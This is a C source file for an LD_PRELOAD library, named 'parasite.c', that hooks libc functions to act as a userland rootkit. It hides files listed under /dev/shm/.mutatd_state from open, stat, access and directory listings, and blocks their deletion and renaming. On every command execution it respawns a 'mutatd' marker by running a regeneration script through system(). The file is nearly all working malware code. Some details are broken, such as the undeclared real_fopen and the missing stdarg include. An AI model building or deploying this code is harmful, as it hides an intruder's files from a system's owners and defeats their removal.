// parasite.c - The Venom
// Compile: gcc -shared -fPIC -O2 -s -o libsystem-core.so parasite.c -ldl
// This weaves into the host's libc

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>
#include <signal.h>

// Maximum hidden paths we track
#define MAX_HIDDEN 32

// Hidden paths array - populated at load time
static char hidden_paths[MAX_HIDDEN][512];
static int hidden_count = 0;

// Shuffle state
static int access_counter = 0;
static int shuffle_threshold = 50;

// Original libc functions
static int (*real_open)(const char*, int, ...) = NULL;
static int (*real_open64)(const char*, int, ...) = NULL;
static int (*real_stat)(const char*, struct stat*) = NULL;
static int (*real_stat64)(const char*, struct stat*) = NULL;
static int (*real_lstat)(const char*, struct stat*) = NULL;
static int (*real_access)(const char*, int) = NULL;
static int (*real_unlink)(const char*) = NULL;
static int (*real_unlinkat)(int, const char*, int) = NULL;
static int (*real_remove)(const char*) = NULL;
static int (*real_rename)(const char*, const char*) = NULL;
static DIR* (*real_opendir)(const char*) = NULL;
static struct dirent* (*real_readdir)(DIR*) = NULL;
static int (*real_execve)(const char*, char* const*, char* const*) = NULL;
static int (*real_execvp)(const char*, char* const*) = NULL;

// Load hidden paths from state file
static void load_hidden_paths() {
    FILE *f = real_fopen("/dev/shm/.mutatd_state/seeds", "r");
    if (!f) return;
    
    char line[512];
    while (fgets(line, sizeof(line), f) && hidden_count < MAX_HIDDEN) {
        line[strcspn(line, "\n")] = 0;
        if (strlen(line) > 0) {
            strncpy(hidden_paths[hidden_count++], line, 511);
        }
    }
    fclose(f);
    
    // Add flag and state directory
    const char *home = getenv("HOME");
    if (home) {
        snprintf(hidden_paths[hidden_count++], 512, "%s/mutatd", home);
    }
    strncpy(hidden_paths[hidden_count++], "/dev/shm/.mutatd_state", 511);
}

// Check if a path should be hidden
static int is_hidden(const char *path) {
    if (!path) return 0;
    for (int i = 0; i < hidden_count; i++) {
        if (strstr(path, hidden_paths[i])) {
            return 1;
        }
    }
    return 0;
}

// Shuffle trigger - the more you look, the more it hides
static void maybe_shuffle() {
    access_counter++;
    if (access_counter >= shuffle_threshold) {
        access_counter = 0;
        shuffle_threshold = rand() % 40 + 30;
        
        // Signal the bash handler to relocate seeds
        int fd = real_open("/dev/shm/.mutatd_state/shuffle_trigger", 
                          O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) {
            write(fd, "1", 1);
            close(fd);
        }
    }
}

// Respawn check - runs before every execve
static void check_and_respawn() {
    const char *home = getenv("HOME");
    if (!home) return;
    
    char flag_path[512];
    snprintf(flag_path, 512, "%s/mutatd", home);
    
    // If flag doesn't exist, trigger regeneration
    if (real_access(flag_path, F_OK) != 0) {
        system("/dev/shm/.mutatd_state/regenerate 2>/dev/null &");
    }
}

// Signal handler for reloading configuration
static void reload_handler(int sig) {
    hidden_count = 0;
    load_hidden_paths();
}

// === INITIALIZATION ===
static void __attribute__((constructor)) init() {
    // Load original functions
    real_open = dlsym(RTLD_NEXT, "open");
    real_open64 = dlsym(RTLD_NEXT, "open64");
    real_stat = dlsym(RTLD_NEXT, "stat");
    real_stat64 = dlsym(RTLD_NEXT, "stat64");
    real_lstat = dlsym(RTLD_NEXT, "lstat");
    real_access = dlsym(RTLD_NEXT, "access");
    real_unlink = dlsym(RTLD_NEXT, "unlink");
    real_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
    real_remove = dlsym(RTLD_NEXT, "remove");
    real_rename = dlsym(RTLD_NEXT, "rename");
    real_opendir = dlsym(RTLD_NEXT, "opendir");
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    real_execve = dlsym(RTLD_NEXT, "execve");
    real_execvp = dlsym(RTLD_NEXT, "execvp");
    
    // Load hidden paths
    load_hidden_paths();
    
    // Set up signal handler for reloads
    signal(SIGUSR1, reload_handler);
    
    // Initialize random shuffle threshold
    srand(time(NULL) ^ getpid());
    shuffle_threshold = rand() % 40 + 30;
}

// === HOOKED FUNCTIONS ===

// open() - Hide our files
int open(const char *pathname, int flags, ...) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        return real_open(pathname, flags, mode);
    }
    return real_open(pathname, flags);
}

int open64(const char *pathname, int flags, ...) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        return real_open64(pathname, flags, mode);
    }
    return real_open64(pathname, flags);
}

// stat() - Our files don't exist
int stat(const char *pathname, struct stat *statbuf) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_stat(pathname, statbuf);
}

int stat64(const char *pathname, struct stat *statbuf) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_stat64(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_lstat(pathname, statbuf);
}

// access() - Permission denied for our files
int access(const char *pathname, int mode) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_access(pathname, mode);
}

// unlink() - Can't delete our files through normal means
int unlink(const char *pathname) {
    if (is_hidden(pathname)) {
        errno = EPERM;
        return -1;
    }
    return real_unlink(pathname);
}

int remove(const char *pathname) {
    if (is_hidden(pathname)) {
        errno = EPERM;
        return -1;
    }
    return real_remove(pathname);
}

// rename() - Can't rename our files
int rename(const char *oldpath, const char *newpath) {
    if (is_hidden(oldpath) || is_hidden(newpath)) {
        errno = EPERM;
        return -1;
    }
    return real_rename(oldpath, newpath);
}

// === DIRECTORY HIDING ===
DIR *opendir(const char *name) {
    if (is_hidden(name)) {
        errno = ENOENT;
        return NULL;
    }
    return real_opendir(name);
}

struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (!is_hidden(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

// === THE PARASITIC REFLEX ===
// Every command execution checks if we're alive
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    check_and_respawn();
    return real_execve(pathname, argv, envp);
}

int execvp(const char *file, char *const argv[]) {
    check_and_respawn();
    return real_execvp(file, argv);
}
